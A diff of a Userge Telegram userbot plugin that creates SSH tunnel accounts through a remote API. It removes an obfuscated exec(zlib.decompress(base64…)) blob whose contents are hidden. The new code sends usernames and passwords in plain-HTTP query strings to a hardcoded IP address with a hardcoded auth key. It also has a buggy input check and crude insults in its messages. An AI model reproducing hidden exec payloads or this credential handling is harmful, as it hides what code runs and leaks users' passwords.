@@ -1,2 +1,63 @@
-import zlib,base64
-exec(zlib.decompress(base64.b64decode("eJztVlFv4kYQfudX7LnSYShnAuUgsWS1UZI2VS5tVIhOVYpgscewh73r7K4PEOLh/sO997X9W/dLOvZiSK+QptVVp0pYYO/OfDszOzszOyxOhNSEMjHROikxMx1RBe1WKZQiJslCirGkMVnzgKexMqxUgRxDwTCzGrkGpegYClmaxUgUqkZiqic1IuE+BaVVNqqRN0rwAhlQDRmaUEXOewW1wGdUHO826ixiwHWNhCzSIFWpVJoADUASjyyt09ve5eDq4mfLtWKYMmuF7G+MtY7gAz8O7BLBx1JqMgiEVSN0JFLtLXNq9pSNtLJLrDMJaCbpdi/Jqe+LlGurtsUFoHzJEs0Ez8BTGNNRqiknizGZ0Ht2zx6i08xPGW6p5cooJ3eZYX33DuYJvpNZ31pVSlQtuE8CCMkAYRM7Ni52C19X3FyohAT9EOCm1wCH8STVA6Vlzmch4UIXMHdjCJ1RpjdrQErbGg6H3yuWn6mbzFy0howiMXXwQRa6KIBowLj3srKRIkGnkheK0Nm5Msafqu9bITFC0E0yVQ8V/1Ul2aWztENywHQuugsB5WOkx6MUVdBpymtEp3w8TtfSzTbSXa5z8M8Su+Io3Ia2y265cnfUz/HJU/ENg4en4psGn8oIV9ib7YZWlqVuvd5oHjuNkxOn2ezg/8htn7RP6jQIMrfV0WdfZwNvma6eJ1SpmZCBt0xWz5HjLWFl5QLNlk1ozZieFEXAMcnURTsxjO3KOvHyJNyeISYrRduMwwu2MwZto9E1YhJGeea7DZL5Zk0mwNEw17bhfqE01XjyHpnflc243C+iaU6eeZifqe+jVdbeSMrP+wpGlC/olBNfRAzrlQY85GfFGX8UNloEdIFKz3tOVn+cfL42KUJCVkIM5ssMk9UnjENNbSQpj3FtQ6WyL/Y2CrN9enZoVasf3r/7R79q9RdubeQUYVCtkg+//vawCuH8d6TuBn8qpbcYVZzG4KKmIUbXcDfsZh1zBpbsg52LmDKeg4LjmY7DUHVa0/jE8SORBljnuXY46H1Ksrrf7b4iuYBms1kjnU7nMfDrrsEeH/0NaiO11fpqD/RTefSGLl4JGqBWdx9k+N1Fj9TJZa93U284jTtfRmH/UijtkqAJcBy1F5MgHXf8j/xmgGeCc/CzC8klVwDJi9OIvQXDy47zxekYM8TFe4f219QEb9YAL5cZjJTwp4Uk8/6P/XGBF80t1ywysZNn4L74+Vc6K9v7d3uNBEzRUQQD3PEgwewdJBLeMph5PZnCdkFCpYJBLALw8i7IuckI1zh3rk9/ujr/8fUPpa3gyiNdRsR48zP2GZn6Q6dx6DSe0ml0mk7jqOU0jvHbah06jUOn8f/uNFqy0W6zTijDl/NDp/EnyGOdxiMN2qHR+NyNxh8mp9gJ")))
+import aiohttp
+import base64
+from pyrogram import enums
+from userge import userge, Message
+import time, os, math, requests, re, json
+import datetime as DT
+
+
+
+@userge.on_cmd(
+    "ssh_do", about={
+        'header': "Create SSH Account",
+        'description': "kegabutan yg haqiqi",
+        'usage': "{tr}ssh_do [user]:[exp]:[pw]"})
+async def _sshh(message: Message):
+    replied = message.input_str
+    if not replied:
+        await message.err("```Isi user:pw:exp blok....```", del_in=5)
+        return
+    if ":" not in replied:
+        await message.err("```Format harus user:pw:exp...```", del_in=5) 
+        return
+    if ":"":" not in replied:
+        await message.err("```Format harus user:pw:exp...```", del_in=5) 
+        return
+    await message.edit("```Sedang membuat akun, tunggu...```")
+    u = message.input_str.strip().split(':')[0]
+    p = message.input_str.strip().split(':')[1]
+    e = message.input_str.strip().split(':')[2]
+    header = {"AUTH_KEY":"meki"}
+    url = (
+        f"http://128.199.227.220:6969/adduser/exp?user={u}&password={p}&exp={e}"
+    )
+    async with aiohttp.ClientSession() as requests:
+        data = await requests.get(url, headers=header)
+        x = await data.text()
+    #status = x['status']
+    if x != "success":
+        await message.edit("Kebanyakn coli ente...!`")
+        return
+    today = DT.date.today()
+    later = today + DT.timedelta(days=int(e))
+    await message.edit(
+        text=(f"**━━━━━━━━━━━━━━━━**\n"
+              f"** ⟨ SSH Account ⟩** \n"
+              f"**━━━━━━━━━━━━━━━━**\n"
+              f"**Username:** `{u}`\n"
+              f"**Password:** `{p}`\n"
+              f"**Domain:** `rkr0.autocf.site`\n"
+              f"**Port SSL :** `222, 447`\n"
+              f"**Port WS :** `80`\n"
+              f"**Port WS SSL :** `443`\n"
+              f"**━━━━━━━━━━━━━━━━**\n"
+              f"**PayLoad WS:**\n"
+              f"**`GET / HTTP/1.1[crlf]Host: rkr0.autocf.site[crlf]Connection: Keep-Alive[crlf]User-Agent: [ua][crlf]Upgrade: websocket[crlf][crlf]`\n"
+              f"**━━━━━━━━━━━━━━━━**\n"
+              f"**Exp Until:** `{later}`\n"
+              f"**━━━━━━━━━━━━━━━━**\n"),
+         
+        disable_web_page_preview=True,
+        parse_mode=enums.ParseMode.MARKDOWN
+     
+    )
